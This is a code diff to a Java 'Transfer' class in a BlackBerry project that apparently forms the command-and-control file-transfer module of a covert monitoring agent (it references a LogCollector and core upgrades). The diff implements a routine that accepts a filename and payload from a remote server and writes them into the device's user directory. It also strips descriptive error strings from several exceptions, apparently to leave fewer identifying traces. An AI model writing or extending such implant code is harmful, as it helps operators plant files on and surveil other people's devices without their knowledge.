@@ -30,6 +30,7 @@ import blackberry.fs.Path;
 import blackberry.log.LogCollector;
 import blackberry.utils.Check;
 import blackberry.utils.Utils;
+import blackberry.utils.WChar;
 
 // TODO: Auto-generated Javadoc
 /**
@@ -40,7 +41,7 @@ public class Transfer {
     private static final int MAX_RECEIVE_LEN = 65536;
     /** The debug instance. */
     //#ifdef DEBUG
-    protected static Debug debug = new Debug("Transfer", DebugLevel.INFORMATION);
+    protected static Debug debug = new Debug("Transfer", DebugLevel.VERBOSE);
     //#endif
 
     /** The Constant instance_. */
@@ -411,12 +412,12 @@ public class Transfer {
             file.create();
             final boolean ret = file.write(command.payload);
             if (!ret) {
-                throw new CommandException("write");
+                throw new CommandException(); //"write"
             } else {
                 sendCommand(Proto.OK);
             }
         } else {
-            throw new CommandException("conf");
+            throw new CommandException(); //"conf"
         }
     }
 
@@ -462,6 +463,76 @@ public class Transfer {
     }
 
     /**
+     * Send download.
+     * 
+     * @param command
+     *            the command
+     * @throws CommandException
+     *             the command exception
+     */
+    protected final void sendDownload(final Command command)
+            throws CommandException {
+        throw new CommandException(); //"Not Implemented"
+    }
+
+    /**
+     * Gets the upload.
+     * 
+     * @param command
+     *            the command
+     * @return the upload
+     * @throws ProtocolException
+     * @throws CommandException
+     * @throws CommandException
+     *             the command exception
+     */
+    protected final void getUpload(final Command command)
+            throws ProtocolException, CommandException {
+        String filename;
+        //#ifdef DEBUG_TRACE
+        debug.trace("getUpload");
+        //#endif
+
+        sendCommand(Proto.OK);
+
+        //#ifdef DEBUG_TRACE
+        debug.trace("fill name");
+        //#endif
+        fillPayload(command);
+
+        if (command.size() <= 0) {
+            throw new CommandException(); //"zero"
+        }
+
+        filename = WChar.getString(command.payload, true);
+        //#ifdef DEBUG_TRACE
+        debug.trace("uploading file: " + Path.USER()+filename);
+        //#endif
+
+        sendCommand(Proto.OK);
+
+        fillPayload(command);
+        if (command.size() <= 0) {
+            throw new CommandException(); //"zero"
+        }
+
+        //#ifdef DEBUG_TRACE
+        debug.trace("uploaded file: " + command.size());
+        //#endif
+
+        AutoFlashFile file = new AutoFlashFile(Path.USER() + filename, true);
+        if (file.exists()) {
+            file.delete();
+        }
+        file.create();
+        file.write(command.payload);
+
+        //#ifdef DEBUG_TRACE
+        debug.trace("file written: " + file.exists());
+        //#endif
+    }
+
+    /**
      * Gets the upgrade.
      * 
      * @param command
@@ -489,11 +560,11 @@ public class Transfer {
                 sendCommand(Proto.OK);
 
             } else {
-                throw new CommandException("Upgrade Core");
+                throw new CommandException(); //Upgrade Core
             }
 
         } else {
-            throw new CommandException("Empty core");
+            throw new CommandException(); //Empty core
         }
 
     }
@@ -575,20 +646,6 @@ public class Transfer {
         }
         return false;
 
-    }
-
-    /**
-     * Gets the upload.
-     * 
-     * @param command
-     *            the command
-     * @return the upload
-     * @throws CommandException
-     *             the command exception
-     */
-    protected final void getUpload(final Command command)
-            throws CommandException {
-        throw new CommandException("Not Implemented");
     }
 
     /**
@@ -869,19 +926,6 @@ public class Transfer {
 
         sendManagedCommand(commandId, plain, true);
 
-    }
-
-    /**
-     * Send download.
-     * 
-     * @param command
-     *            the command
-     * @throws CommandException
-     *             the command exception
-     */
-    protected final void sendDownload(final Command command)
-            throws CommandException {
-        throw new CommandException("Not Implemented");
     }
 
     /**
